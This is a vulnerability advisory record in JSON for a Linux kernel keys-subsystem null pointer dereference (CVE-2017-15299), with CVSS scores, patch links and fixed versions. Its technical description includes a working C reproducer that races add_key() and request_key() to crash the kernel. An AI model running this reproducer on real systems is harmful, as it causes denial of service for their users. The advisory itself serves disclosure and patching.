{
    "source": "BDSA",
    "name": "BDSA-2017-1972",
    "title": "Linux Kernel Keys Subsystem Allows Denial of Service via Null Pointer Dereference",
    "description": "An update on an uninstantiated key in the key management subsystem of the linux kernel could allow an attacker to cause a local denial-of-service (*DoS*) condition.",
    "technicalDescription": "If the `add_key()` method is passed a key that already exists then that key's `update()` method will be called. However if the key is uninstantiated then `call_key_instantiate_and_link()` will not be called. This means that many of the actions that should be carried out when the key is instantiated do not take place. When passed an uninstantiated key the `update()` methods of the encrypted and trusted key types will dereference a null pointer resulting in a denial-of-service (*DoS*).   \n\nA reproducer for the issue is included below:\n\n    #include <stdlib.h>\n    #include <unistd.h>\n    #include <keyutils.h>\n\n    int main(void)\n    {\n        int ringid = keyctl_join_session_keyring(NULL);\n\n        if (fork()) {\n            for (;;) {\n                const char payload[] = \"update user:foo 32\";\n\n                usleep(rand() % 10000);\n                add_key(\"encrypted\", \"desc\", payload, sizeof(payload), ringid);\n                keyctl_clear(ringid);\n            }\n        } else {\n            for (;;)\n                request_key(\"encrypted\", \"desc\", \"callout_info\", ringid);\n        }\n    }",
    "publishedDate": "2017-11-28T09:47:31.150Z",
    "updatedDate": "2018-10-03T07:02:06.186Z",
    "disclosureDate": "2017-09-27T00:00:00.000Z",
    "exploitPublishDate": "2017-09-27T00:00:00.000Z",
    "solution": "A [patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=60ff5b2f547af3828aebafd54daded44cfb0807a) for this issue is available. \n\nUpgrade to versions **3.16.50**, **4.1.46**, **4.13.10**, **4.9.59**, **4.4.95**, **3.18.78**, **4.14-rc6**",
    "severity": "MEDIUM",
    "cvss2": {
        "baseScore": 4.9,
        "impactSubscore": 6.9,
        "exploitabilitySubscore": 3.9,
        "severity": "MEDIUM",
        "accessVector": "LOCAL",
        "accessComplexity": "LOW",
        "authentication": "NONE",
        "confidentialityImpact": "NONE",
        "integrityImpact": "NONE",
        "availabilityImpact": "COMPLETE",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 4.1
        },
        "vector": "(AV:L/AC:L/Au:N/C:N/I:N/A:C/E:F/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 7.1,
        "impactSubscore": 4.0,
        "exploitabilitySubscore": 2.5,
        "severity": "MEDIUM",
        "attackVector": "LOCAL",
        "attackComplexity": "LOW",
        "confidentialityImpact": "NONE",
        "integrityImpact": "NONE",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "CHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "FUNCTIONAL",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 6.6
        },
        "vector": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H/E:F/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Eric Biggers",
    "workaround": "v3.16.50\nv4.1.46\nv4.13.10\nv4.9.59\nv4.4.95\nv3.18.78\nv4.14-rc6",
    "vendorFixDate": "2017-10-18T00:00:00.000Z",
    "bdsaTags": [],
    "overallScore": 6.6,
    "_meta": {
        "allow": [],
        "href": "https://trendmicro.app.blackduck.com/api/vulnerabilities/BDSA-2017-1972",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro.app.blackduck.com/api/cwes/CWE-476"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro.app.blackduck.com/api/vulnerabilities/CVE-2017-15299",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro.app.blackduck.com/api/vulnerabilities/BDSA-2017-1972/ranges"
            },
            {
                "rel": "reference",
                "href": "http://blog.linuxcounter.net/2017/10/18/new-linux-kernel-version-4-13-8-available-for-download/",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://bugzilla.redhat.com/show_bug.cgi?id=1498016",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=60ff5b2f547af3828aebafd54daded44cfb0807a",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://www.mail-archive.com/linux-kernel@vger.kernel.org/msg1499828.html",
                "label": "EXPLOIT"
            }
        ]
    }
}